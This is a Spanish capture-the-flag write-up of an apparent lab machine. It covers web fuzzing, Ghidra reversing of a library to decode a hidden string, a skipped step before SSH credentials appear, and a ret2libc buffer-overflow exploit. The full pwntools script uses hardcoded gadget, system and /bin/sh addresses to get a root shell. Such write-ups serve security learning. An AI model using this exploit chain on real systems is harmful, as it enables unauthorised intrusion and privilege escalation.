Puerto 22 : SSH

Puerto 80 : HTTP 

En el escaneo encuentro un dominio:

```bash
http://insanity.dl
```

De una le hago fuzz:

```bash
fuff -c -w /dirb/big.txt -u http://domain -H “Host: FUZZ.domain” -fw 20
```

Pero no encuentro nada que sirva.

Inspeccionando el código encuentro algo:

```bash
<!-- Subdominio?? -->
<!-- Tal vez fuzzing??? -->
<!-- O capaz ninguno... -->
```

Por la ultima frase confirmo que no hay subdominio y pruebo con directorios:

```bash
gobuster dir -u http://insanity.dl/ -w ../../Downloads/directory-list-2.3-big.txt -x html,php,txt -t 100 -k 
```

Encuentro un directorio llamado /tinyp que es evidente que es vulnerable. Dentro hay 2 archivos ejecutables:

```bash
libcredenciales.so
secret
```

Si ejecutamos el `secret` veremos lo siguiente:

```bash
./secret
# Info:
Introduce la clave: 1234
Clave incorrecta.
```

Antes de pasar al otro decido hacerle ingeniería inversa al archivo "libcredenciales.so" con Ghidra.

Información técnica sobre el código:

NOTA: Análisis de código y script son sacados de Gitbook.com

### Análisis del código:

1. **`a(int param_1)`**:
    - Este realiza una transformación condicional:
        - Si el valor está entre `1` y `0x1A`, suma `0x60`.
        - Si no, hay casos especiales para `0x1B`, `0x1C`, `0x1D`, y `0x1E`.
        - Valores que no encajan en ninguna de estas condiciones se convierten a `0x3F`.
2. **`b(long param_1, int param_2, long param_3)`**:
    - Llama a `a()` para cada valor en un arreglo de enteros, transformándolos en caracteres que almacena en el espacio apuntado por `param_3`.
3. **`g()`**:
    - Define un arreglo de valores (`local_4d8`, `local_4d4`, ..., `local_438`).
    - Usa `b()` para convertir estos valores en una cadena almacenada en `auStack_528`.
    - Construye una URL y ejecuta un comando `wget` para descargar un archivo.

Así que uso el script para decodificarlo:

```python
def a(param_1):
    if param_1 < 1 or param_1 > 0x1A:
        if param_1 == 0x1B:
            return 0x3A
        elif param_1 == 0x1C:
            return 0x2F
        elif param_1 == 0x1D:
            return 0x2E
        elif param_1 == 0x1E:
            return 0x5F
        else:
            return 0x3F
    else:
        return param_1 + 0x60

def b(values):
    result = ""
    for value in values:
        result += chr(a(value))
    return result

# Valores extraídos de g()
values = [
    8, 20, 20, 16, 27, 28, 28, 9, 14, 19, 1, 14, 9, 20, 25, 29, 4, 12, 28, 21,
    12, 20, 18, 1, 30, 19, 5, 3, 18, 5, 20, 30, 6, 15, 12, 4, 5, 18, 11, 13, 1
]

# Ejecutar b() sobre los valores
result = b(values)
print("Resultado:", result)
```

Revelando así las credenciales SSH:

```python
maci:CrACkEd
```

## Escalada

Pruebo con los permisos SUID:

```python
find / -type f -perm -4000 -ls 2>/dev/null
```

Encuentro que en la carpeta /opt hay un ejecutable con un nombre muy conveniente:

```python
cd /opt
./vuln
```

El script tiene input, por ende hay posibilidad de un desbordamiento de buffer.

Pruebo con este input:

```python
./vuln
Escribe tu nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Confirmo. 

Veo que el servidor tiene instalado gdb:

```python
gdb -h
```

Pero mejor lo analizo en la máquina host:

```bash
# En la ubicación del archivo:
python3 -m http.server 100

# Desde el host:
http://172.17.0.2:100/vuln
```

Lo abro con Pwntools:

```bash
gdb -q vuln 
```

Primero analizo la seguridad del binario:

```bash
(gdb) checksec
```

Podemos ver que solo la protección NX (Not Executable) está activada, esto significa que no podemos ejecutar shellcode en la pila. ( Más información en la sección de 4. Post-Explotación de mi repositorio :) )

Confirmo que el ASLR esta deshabilitado:

```bash
maci@dockerlabs:/opt$ cat /proc/sys/kernel/randomize_va_space 
# Info:
0
```

Para empezar obtengo el offset de RSP:

```bash
(gdb) pattern offset $rsp
[+] Found at offset 136
```

Luego es necesario conocer la dirección del gadget pop rdi, así que utilizo una herramienta llamada Ropper desde la maquina host:

```bash
ropper --file vuln --search "pop rdi"
# Info: 
[INFO] File: vuln
0x000000000040116a: pop rdi; nop; pop rbp; ret;
```

Ahora voy a encontrar la dirección de la función system desde gdb:

```bash
(gdb) b *main
# Info:
Breakpoint 1 at 0x40118a
```

Compruebo ejecutando el binario.

Y encontrar system:

```bash
(gdb) p system
$1 = {int (const char *)} 0x7ffff7e27490 <__libc_system>
```

Ahora encontrar la cadena /bin/sh, la manera es distinta:

```bash
(gdb) find &system,+9999999,"/bin/sh"
0x7ffff7f71031
```

Lo verifico:

```bash
(gdb) x/s 0x7ffff7f71031
0x7ffff7f71031: "/bin/sh"
```

Ya que tenemos todo lo necesario:

- Pop_rdi
- Offset
- Sys_addr
- Sh_addr

Creo un script con python usando pwntools:

```bash
from pwn import *

def exploit():
    load = ELF("/opt/vuln")
    prc = process("/opt/vuln")

    offset = 136
    
    # 0x000000000040116a: pop rdi; nop; pop rbp; ret;
    # 0x7ffff7e27490: system
    # 0x7ffff7f71031: /bin/sh

    pop_rdi = p64(0x40116a)
    sys_addr = p64(0x7ffff7e27490)
    sh_addr = p64(0x7ffff7f71031)
    null = p64(0x0)

    payload = b"A"*offset + pop_rdi + sh_addr + null + sys_addr

    prc.sendafter(b"nombre: ", payload)
    prc.interactive()

if __name__ == "__main__":
    exploit()
```

Lo envio a la maquina victima:

```bash
 scp exploit.py maci@172.17.0.2:/tmp
```

Y lo ejecuto:

```bash
python3 /tmp/exploit.py 
```

Listo.
